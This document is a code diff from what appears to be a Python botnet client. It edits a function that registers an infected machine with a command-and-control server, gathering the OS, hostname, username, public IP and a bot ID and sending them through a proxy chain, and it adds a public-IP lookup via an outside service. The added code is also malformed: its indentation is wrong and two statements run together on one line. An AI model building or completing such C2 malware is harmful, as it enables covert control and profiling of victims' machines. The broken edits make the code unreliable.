@@ -651,15 +651,14 @@ logger = logging.getLogger('Bot')
 def register_with_c2(ghost_comm_client):
     logger.info(f"Attempting to register bot with C2...")
     try:
-        info = {
-            'os': platform.system(),
-            'hostname': platform.node(),
-            'user': getpass.getuser(),
-            'ip': public_ip()
-        }
-        payload = {'type': 'register', 'info': info}
-        response = ghost_comm_client.send_data_through_distributed_proxy_chain(json.dumps(payload).encode('utf-8'))
-        response_data = json.loads(response.decode('utf-8'))
+                    info = {
+                        'os': platform.system(),
+                        'hostname': platform.node(),
+                        'user': getpass.getuser(),
+                        'ip': public_ip()
+                    }
+                    payload = {'type': 'register', 'info': info, 'id': BOT_ID} # Add bot_id to payload
+                    response = ghost_comm_client.send_data_through_distributed_proxy_chain(json.dumps(payload).encode('utf-8'))        response_data = json.loads(response.decode('utf-8'))
         if response_data.get('status') == 'ok':
             logger.info("Successfully registered with C2 server.")
             return response_data.get('bot_id')
@@ -671,8 +670,13 @@ def register_with_c2(ghost_comm_client):
         return None
 
 def public_ip():
-    # This function needs to be implemented to get the public IP of the bot
-    return "127.0.0.1"
+    try:
+        response = requests.get("https://api.ipify.org")
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        return response.text
+    except requests.exceptions.RequestException as e:
+        logger.error(f"Failed to get public IP: {e}")
+        return "Unknown"
 
 if __name__ == '__main__':
     debug("Starting Tor Expert Bundle automation script...")
